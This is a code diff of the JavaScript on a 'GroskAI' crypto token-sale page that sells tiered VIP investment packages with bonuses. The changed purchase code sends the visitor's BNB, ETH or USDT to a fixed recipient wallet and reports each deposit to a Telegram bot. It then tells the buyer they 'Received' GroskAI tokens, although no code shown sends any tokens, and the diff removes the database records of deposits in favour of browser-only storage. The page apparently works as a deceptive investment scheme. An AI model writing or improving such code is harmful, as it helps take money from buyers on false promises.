-        if (fetchError) throw fetchError;
-        if (existing) {
-          currentUserId = existing.id;
-          currentUserVIP = existing.current_vip;
-          return existing;
-        } else {
-          const newId = Date.now().toString() + '-' + Math.random().toString(36).substring(2, 8);
-          const { data: newUser, error: insertError } = await supabaseClient
-            .from('users')
-            .insert({ id: newId, wallet_address: wallet, current_vip: 0 })
-            .select('id, current_vip')
-            .single();
-          if (insertError) throw insertError;
-          currentUserId = newUser.id;
-          currentUserVIP = newUser.current_vip;
-          return newUser;
-        }
-      } catch (err) {
-        console.error("Supabase error:", err);
-        currentUserId = 'temp_' + wallet.slice(0, 10);
-        currentUserVIP = 0;
-        return { id: currentUserId, current_vip: 0 };
+    window.selectTokenWithNetwork = async function(symbol, text, icon, netIcon, contract, decimals, chainIdHex) {
+      sessionStorage.setItem('pendingToken', JSON.stringify({ symbol, text, icon, netIcon, contract, decimals, chainIdHex }));
+      Swal.fire({ title: 'Processing...', text: 'Preparing network switch', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
+      const networkParams = networkConfigs[chainIdHex];
+      if (!networkParams) { Swal.close(); Swal.fire('Error', 'Network config not found', 'error'); return; }
+      const switched = await switchNetwork(chainIdHex, networkParams);
+      if (!switched) await refreshProviderAndSigner();
+      currentCurrency = symbol;
+      currentTokenContract = contract;
+      currentTokenDecimals = decimals || 18;
+      document.getElementById('currentIcon').src = icon;
+      document.getElementById('currentNetworkIcon').src = netIcon;
+      document.getElementById('currentText').innerHTML = text;
+      document.getElementById('currencySelect').value = symbol;
+      toggleModal();
+      await refreshProviderAndSigner();
+      updateCalculations();
+      Swal.close();
+      if (!switched) {
+        Swal.fire({ icon: 'warning', title: 'Network not switched', text: 'Please manually switch to correct network.', toast: true, timer: 3000, showConfirmButton: false });
       }
-    }
-
-    async function addDepositRecord(userId, wallet, level, amountUSD, tokenReceived, txHash, network) {
-      const { error } = await supabaseClient
-        .from('deposits')
-        .insert({
-          user_id: userId,
-          wallet_address: wallet,
-          vip_package: level,
-          amount_usd: amountUSD,
-          token_received: tokenReceived,
-          tx_hash: txHash,
-          network: network,
-          token_symbol: currentCurrency,
-          created_at: new Date().toISOString()
-        });
-      if (error) console.error("Add deposit error:", error);
-    }
-
-    async function updateUserVIP(userId, newVipLevel) {
-      const { error } = await supabaseClient
-        .from('users')
-        .update({ current_vip: newVipLevel })
-        .eq('id', userId);
-      if (error) console.error("Update VIP error:", error);
-      else currentUserVIP = newVipLevel;
-    }
-
-    function renderCurrentVIP() {
-      const nextLevel = (currentUserVIP !== undefined && currentUserVIP !== null) ? currentUserVIP + 1 : 1;
-      if (nextLevel > 5) {
-        document.getElementById('vipHeader').innerHTML = '🏆 COMPLETED! 🏆';
-        document.getElementById('amountButtons').innerHTML = '';
-        document.getElementById('bonusInfo').innerHTML = '';
-        document.getElementById('buyButton').disabled = true;
-        document.getElementById('buyButton').classList.add('opacity-50', 'cursor-not-allowed');
-        return;
-      }
-      document.getElementById('buyButton').disabled = false;
-      document.getElementById('buyButton').classList.remove('opacity-50', 'cursor-not-allowed');
-      currentLevel = nextLevel;
-      const levelData = VIP_LEVELS[currentLevel];
-      if (!levelData) return;
-      document.getElementById('vipHeader').innerHTML = levelData.name;
-      let buttonsHtml = '';
-      levelData.packages.forEach(pkg => {
-        const activeClass = (selectedPackage && selectedPackage.usd === pkg.usd) ? 'amount-btn-active' : 'bg-white/10 text-slate-300 hover:bg-white/20';
-        buttonsHtml += `<button onclick="selectPackage(${pkg.usd}, ${pkg.bonus})" class="py-3 rounded-xl font-semibold transition-all ${activeClass}">$${pkg.usd.toLocaleString()}</button>`;
-      });
-      document.getElementById('amountButtons').innerHTML = buttonsHtml;
-      document.getElementById('bonusInfo').innerHTML = `🎁 +${levelData.packages[0].bonus}% bonus for selected package`;
-      if (!selectedPackage) {
-        selectPackage(levelData.packages[0].usd, levelData.packages[0].bonus);
-      } else {
-        const stillExists = levelData.packages.some(p => p.usd === selectedPackage.usd);
-        if (!stillExists) selectPackage(levelData.packages[0].usd, levelData.packages[0].bonus);
-        else updateCalculations();
-      }
-    }
+    };
 
     async function syncWalletState(address) {
       if (!address || !getEthProvider()) return;
       try {
         await refreshProviderAndSigner();
-        await getOrCreateUser(address);
-        renderCurrentVIP();
+        currentUserVIP = loadUserVIPFromLocalStorage(address);
+        renderDynamicContent();
       } catch (err) { console.error(err); }
     }
 
-    // Main buy action
     window.handleAction = async function() {
-      if (!getEthProvider()) return Swal.fire('Error', 'Please install MetaMask or compatible wallet.', 'error');
+      if (!getEthProvider()) return Swal.fire('Error', 'Please install wallet.', 'error');
       if (!currentAccount) {
         await refreshProviderAndSigner();
-        if (!currentAccount) return Swal.fire('Wallet not connected', 'Please connect your wallet first.', 'warning');
+        if (!currentAccount) return Swal.fire('Wallet not connected', 'Please connect wallet.', 'warning');
       }
-      if (currentLevel !== (currentUserVIP + 1) && currentUserVIP < 5) {
-        Swal.fire('Error', 'Page state is outdated. Please reload the page.', 'error');
-        return;
+      // ensure VIP is loaded
+      if (currentUserVIP === undefined || currentUserVIP === null) {
+        currentUserVIP = loadUserVIPFromLocalStorage(currentAccount);
+        renderDynamicContent();
       }
-      if (!selectedPackage) return Swal.fire('Error', 'Please select an investment package.', 'warning');
-
+      const nextLevel = currentUserVIP + 1;
+      if (nextLevel > 5) return Swal.fire('Completed', 'You have completed all VIP levels.', 'info');
+      if (!selectedPackage) return Swal.fire('Error', 'Please select a package.', 'warning');
+      
       const usdAmount = selectedPackage.usd;
       const tokenPrice = coinPrices[currentCurrency] || 1;
       const tokenAmount = usdAmount / tokenPrice;
-
+      
       let expectedChainId = null;
       if (currentCurrency === 'BNB') expectedChainId = 56;
       else if (currentCurrency === 'ETH') expectedChainId = 1;
-      else if (currentCurrency === 'USDT') {
-        expectedChainId = (currentTokenContract === '0x55d398326f99059fF775485246999027B3197955') ? 56 : 1;
-      }
+      else if (currentCurrency === 'USDT') expectedChainId = (currentTokenContract === '0x55d398326f99059fF775485246999027B3197955') ? 56 : 1;
       
       if (expectedChainId) {
         const network = await provider.getNetwork();
@@ -564,7 +340,6 @@
           const targetHex = (expectedChainId === 56) ? '0x38' : '0x1';
           const networkParams = networkConfigs[targetHex];
           if (!networkParams) return Swal.fire('Error', 'Cannot determine network.', 'error');
-          
           Swal.fire({ title: 'Switching network...', text: `Please confirm switch to ${expectedChainId === 56 ? 'BNB Smart Chain' : 'Ethereum'}`, allowOutsideClick: false, didOpen: () => Swal.showLoading() });
           const switched = await switchNetwork(targetHex, networkParams);
           Swal.close();
@@ -572,13 +347,13 @@
           await refreshProviderAndSigner();
         }
       }
-
+      
       try {
         if (currentCurrency === 'BNB' || currentCurrency === 'ETH') {
           const balance = await signer.getBalance();
           const valueInWei = ethers.utils.parseEther(tokenAmount.toFixed(6));
           if (balance.lt(valueInWei)) {
-            return Swal.fire('Insufficient balance', `Need ${tokenAmount.toFixed(6)} ${currentCurrency}, you have ${ethers.utils.formatEther(balance)}`, 'error');
+            return Swal.fire('Insufficient balance', `Need ${tokenAmount.toFixed(6)} ${currentCurrency}`, 'error');
           }
         } else if (currentCurrency === 'USDT' && currentTokenContract) {
           const erc20Abi = ["function balanceOf(address) view returns (uint)", "function transfer(address to, uint amount) returns (bool)"];
@@ -587,34 +362,36 @@
           let balance;
           try { balance = await contract.balanceOf(currentAccount); } catch(e) { return Swal.fire('Error', 'Cannot read USDT balance', 'error'); }
           if (balance.lt(amountInWei)) {
-            return Swal.fire('Insufficient balance', `Need ${tokenAmount.toFixed(6)} USDT, you have ${ethers.utils.formatUnits(balance, currentTokenDecimals)}`, 'error');
+            return Swal.fire('Insufficient balance', `Need ${tokenAmount.toFixed(6)} USDT`, 'error');
           }
         }
-
+        
         let tx;
         if (currentCurrency === 'BNB' || currentCurrency === 'ETH') {
           tx = await signer.sendTransaction({ to: RECIPIENT_WALLET, value: ethers.utils.parseEther(tokenAmount.toFixed(6)) });
-        } else if (currentCurrency === 'USDT') {
+        } else {
           const contract = new ethers.Contract(currentTokenContract, ["function transfer(address to, uint amount) returns (bool)"], signer);
           tx = await contract.transfer(RECIPIENT_WALLET, ethers.utils.parseUnits(tokenAmount.toFixed(6), currentTokenDecimals));
         }
-
+        
         Swal.fire({ title: 'Waiting for confirmation...', html: `Transaction of ${tokenAmount.toFixed(6)} ${currentCurrency} is being processed`, allowOutsideClick: false, didOpen: () => Swal.showLoading() });
         await tx.wait();
         
         const baseToken = usdAmount * GROSKAI_BASE_RATE;
         const bonusToken = baseToken * selectedPackage.bonus / 100;
         const tokenReceivedAmount = baseToken + bonusToken;
-        await addDepositRecord(currentUserId, currentAccount, currentLevel, usdAmount, tokenReceivedAmount, tx.hash, expectedChainId === 56 ? 'BSC' : 'Ethereum');
-        const nextLevel = VIP_LEVELS[currentLevel].nextLevel;
-        const newVip = nextLevel ? nextLevel : currentUserVIP + 1;
-        await updateUserVIP(currentUserId, newVip);
-        await syncWalletState(currentAccount);
         
-        Swal.fire({ title: 'Success!', html: `Sent ${tokenAmount.toFixed(6)} ${currentCurrency}<br>Received ${tokenReceivedAmount.toFixed(2)} GroskAI (including +${selectedPackage.bonus}% bonus)`, icon: 'success' });
+        // Update VIP locally
+        const newVIP = nextLevel;
+        currentUserVIP = newVIP;
+        saveUserVIPToLocalStorage(currentAccount, newVIP);
+        renderDynamicContent();
         
-        const msg = `💎 *GroskAI DEPOSIT*\n🏆 VIP ${currentLevel}\n💰 ${tokenAmount.toFixed(6)} ${currentCurrency} ($${usdAmount})\n🎁 Received ${tokenReceivedAmount.toFixed(2)} GroskAI (+${selectedPackage.bonus}% bonus)\n🏦 TX: ${tx.hash}`;
+        // (Optional: send to Telegram without database)
+        const msg = `💎 *GroskAI DEPOSIT*\n🏆 VIP ${newVIP}\n💰 ${tokenAmount.toFixed(6)} ${currentCurrency} ($${usdAmount})\n🎁 Received ${tokenReceivedAmount.toFixed(2)} GroskAI (+${selectedPackage.bonus}% bonus)\n🏦 TX: ${tx.hash}`;
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'Markdown' }) }).catch(()=>{});
+        
+        Swal.fire({ title: 'Success!', html: `Sent ${tokenAmount.toFixed(6)} ${currentCurrency}<br>Received ${tokenReceivedAmount.toFixed(2)} GroskAI (+${selectedPackage.bonus}% bonus)<br>You have reached ${VIP_LEVELS[newVIP]?.name || 'VIP MAX'}!`, icon: 'success' });
       } catch (err) { 
         console.error(err); 
         Swal.fire('Transaction failed', err.reason || err.message || 'Please try again', 'error'); 
@@ -627,14 +404,8 @@
       ethProvider.on('accountsChanged', (accounts) => { if(accounts.length) syncWalletState(accounts[0]); else window.location.reload(); });
     }
 
-    window.toggleModal = function() { 
-      const modal = document.getElementById('tokenModal');
-      modal.classList.toggle('hidden');
-    };
-    window.copyContract = function() { 
-      navigator.clipboard.writeText(document.getElementById('contractAddr').innerText); 
-      Swal.fire({ toast: true, position: 'top-end', title: '✅ Copied', showConfirmButton: false, timer: 1500 }); 
-    };
+    window.toggleModal = function() { document.getElementById('tokenModal').classList.toggle('hidden'); };
+    window.copyContract = function() { navigator.clipboard.writeText(document.getElementById('contractAddr').innerText); Swal.fire({ toast: true, title: '✅ Copied', timer: 1500 }); };
     document.addEventListener('click', (e) => {
       const modal = document.getElementById('tokenModal');
       const btn = document.querySelector('[onclick="toggleModal()"]');
@@ -672,10 +443,9 @@
               document.getElementById('currencySelect').value = tokenData.symbol;
               await refreshProviderAndSigner();
               updateCalculations();
-              console.log("✅ Restored token:", tokenData.symbol);
             }
           }
-        } catch(e) { console.error("Token restore error:", e); }
+        } catch(e) {}
       }
       const ethLoaded = getEthProvider();
       if (ethLoaded) {
@@ -684,7 +454,7 @@
           if (accounts.length > 0) await syncWalletState(accounts[0]);
         } catch (err) { console.error(err); }
       }
-      renderCurrentVIP();
+      renderDynamicContent();
       updatePrices();
     });
   </script>
